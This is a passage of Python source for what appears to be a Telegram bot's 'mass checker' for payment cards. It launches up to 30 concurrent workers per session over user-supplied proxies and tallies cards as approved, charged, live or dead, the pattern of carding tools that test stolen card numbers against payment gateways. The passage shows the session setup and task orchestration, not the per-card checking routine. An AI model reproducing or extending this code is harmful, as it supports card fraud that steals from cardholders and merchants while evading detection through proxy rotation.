        "session_id":      session_id,
        "status":          "<b>Cʜᴇᴄᴋɪɴɢ…</b>",
        "chat_id":         chat_id,
        "user_id":         user_id,
        "msg_id":          progress_msg.message_id,
        "user_msg_id":     message.message_id,
        "total":           total_cards,
        "checked":         0,
        "approved":        0,
        "charged":         0,
        "dead":            0,
        "errors":          0,
        "start_time":      time.time(),
        "tasks":           [],
        "proxies":         user_proxies,
        "proxy_manager":   proxy_manager,
        "bad_proxies":     [],
        "last_text":       "",
        "last_update_time": 0,
        "live_cards":      [],
        "dead_cards":      [],
        "charged_cards":   [],
        "error_cards":     [],
        "user_obj":        user_obj,
        "plan_name":       plan_name,
        "is_group":        is_group,
    }

    print(
        f"🚀 [MSH] Started — {total_cards} cards — "
        f"User: {user_id} — Proxies: {len(user_proxies)} — Group: {is_group}"
    )
    logging.info(
        f"🚀 [MSH] Started — {total_cards} cards — "
        f"User: {user_id} — Proxies: {len(user_proxies)} — Group: {is_group}"
    )

    asyncio.create_task(run_mass_checker(bot, session_id, valid_cards, user_obj, plan_name))


async def run_mass_checker(bot: Bot, session_id, cards, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    sem = asyncio.Semaphore(30)

    async def worker(cc_formatted, cc_num):
        if is_session_stopped(session_id):
            return
        async with sem:
            if is_session_stopped(session_id):
                return
            try:
                await process_single_card(
                    session_id, cc_formatted, cc_num,
                    session['user_id'], bot, user_obj, plan_name
                )
            except asyncio.CancelledError:
                print(f"🛑 [MSH] Task cancelled: {cc_formatted}")
                raise
            except Exception as e:
                if not is_session_stopped(session_id):
                    logging.error(f"Worker error for {cc_formatted}: {e}")

    tasks = []
    for cc_formatted, cc_num in cards:
        if is_session_stopped(session_id):
            print(f"🛑 [MSH] Stopped creating tasks — {len(tasks)} created")
            break
        task = asyncio.create_task(worker(cc_formatted, cc_num))
        tasks.append(task)
        session['tasks'].append(task)

    print(f"📋 [MSH] {len(tasks)} tasks created")
    logging.info(f"📋 [MSH] {len(tasks)} tasks created")

    if tasks:
        results   = await asyncio.gather(*tasks, return_exceptions=True)
        cancelled = sum(1 for r in results if isinstance(r, asyncio.CancelledError))
        errors    = sum(1 for r in results if isinstance(r, Exception) and not isinstance(r, asyncio.CancelledError))

        if cancelled > 0:
            print(f"🛑 [MSH] {cancelled} tasks cancelled")
        if errors > 0:
            logging.error(f"[MSH] {errors} tasks failed with exceptions")

    session = MSH_SESSIONS.get(session_id)
    if session and session['status'] != "<b>Sᴛᴏᴘᴘᴇᴅ</b>":
        session['status'] = "<b>Sᴜᴍᴍᴀʀʏ</b>"

    await update_progress_message(bot, session_id)

    print(f"✅ [MSH] Session {session_id} finished")
    logging.info(f"✅ [MSH] Session {session_id} finished")
